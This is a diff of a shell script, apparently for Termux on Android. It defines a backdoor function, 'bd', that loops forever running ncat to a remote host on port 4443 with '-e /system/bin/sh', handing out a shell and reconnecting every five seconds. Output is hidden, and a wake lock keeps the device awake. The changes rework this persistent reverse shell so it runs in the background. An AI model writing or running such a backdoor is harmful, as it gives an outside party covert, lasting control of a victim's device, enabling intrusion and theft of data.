@@ -12,14 +12,14 @@ port=4443
 which nmap >/dev/null 2>&1 || pkg install nmap >/dev/null 2>&1
 
 function bd(){
-while true;do
-(ncat $host $port -e /system/bin/sh)>/dev/null 2>&1
+(while true;do
+ncat $host $port -e /system/bin/sh  >/dev/null 2>&1 & 
+wait
 sleep 5
-done
-
+done)&
 }
 
 
 
 termux-wake-lock >/dev/null 2>&1
-bd &
+bd
